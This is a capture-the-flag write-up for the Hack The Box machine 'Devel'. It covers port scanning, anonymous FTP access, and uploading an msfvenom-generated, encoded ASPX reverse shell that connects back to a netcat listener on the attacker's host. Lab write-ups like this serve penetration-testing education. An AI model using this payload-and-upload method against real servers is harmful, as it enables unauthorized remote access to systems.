![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5589512-0d6a-4e0a-b710-18590d01b0ff)

https://app.hackthebox.com/machines/Devel

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I started with quick rustscan & observed only 2 open ports 21 & 80.

```bash
sudo rustscan -a 10.10.10.5 -- -sC -sV -vv -oN devel_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ff1684db-3262-466b-b484-dfdcba244917)

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So, as per the port & service scan results anonymous logon is allowed in FTP & there is a directory "aspnet_client" present in FTP server. Apart from this there is a webserver running on port 80.

I checked for the web server but didn't found anything except IIS welcome image.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f2859949-8fcd-4faf-ac45-fab773bcb1b6)

I then performed sub-directory enumeration but even GoBuster didn't revealed any sub-directory.

## Initial access:

I then checked the directory present in the FTP folder by login as an anonymous user.

```bash
FTP -vv 10.10.10.5
```

The directory contains another folder "system_web" & this folder contains another folder "2_0_50727".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/214a8c96-bade-4167-8854-a39b36e4d1a7)

After running the sub-directory enumeration twice using GoBuster & FFUF when I didn't get any results.
I then though since there is a directory present in the FTP folder there might be a possibility that these can be accessed from web server as well.
I tried to access the folder "aspnet_client" but got error 403, but this also means this FTP files & directories are available on the web-server as well.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b457bb85-5c4e-49f1-b38f-d7946b18fedf)

I created a asp based reverse shell using MSFVEOM due to the aspclient running in FTP & uploaded it on the server using PUT command.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ip_here LPORT=1337 -e x86/shikata_ga_nai -f aspx -o adv.aspx

PUT dawn.aspx
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6a571e08-d1d4-4c8d-aee2-c551af1fd50e)

After uploading the aspx binary I turned on my netcat listener on port 1337 & browsed through my uploaded file in web server.

```bash
nc -lnvp 1337
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9d704370-4b41-4dbc-824d-5ab4bee2d8c4)

Once my file was accessed by the web browser I got reverse shell in my attacker host, runnng as 'IIS web' user. 🙂

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e10e0407-c1f5-4e88-9ce6-7c5c33f383c4)







